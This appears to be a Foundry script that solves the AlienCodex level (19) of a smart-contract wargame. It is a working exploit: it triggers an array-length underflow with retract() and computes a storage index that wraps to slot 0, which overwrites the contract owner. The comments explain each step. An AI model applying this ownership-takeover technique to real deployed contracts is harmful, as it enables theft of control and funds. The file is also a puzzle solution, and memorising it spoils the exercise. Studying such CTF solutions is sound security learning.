// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import { AlienCodex } from "../src/level19.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

///@notice 
contract Level19Solution is Script {
    AlienCodex level = AlienCodex(0x528e1963259a384a029397eE496E0009A8FC3bc5);
    
    function run () external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // We first need to make contact with the contract so that we will be able to pass the contacted() modifier check.
        level.makeContact();

        // Call retract() which will minus the (empty) array and cause an underflow, which
        // causes the array to become max storage size of 2**256.
        // This allows access to any variables stored in the contract.
        level.retract();

        // Cast our address to bytes32, which will be used to replace the existing owner address
        bytes32 myAddress = bytes32(uint256(uint160(vm.envAddress("MY_ADDRESS"))));

        // Dynamic array - Users keccak256 hashing to store the value positions
        // To 'go to' slot 0 (containing bool and addr values), we need to use the full storage size and then minus slot 1
        // index = (2**256)-keccak256(abi.encode(1))
        uint256 index = (2**256) - uint256(keccak256(abi.encode(1)));
        level.revise(index, myAddress);

        vm.stopBroadcast();
    }
}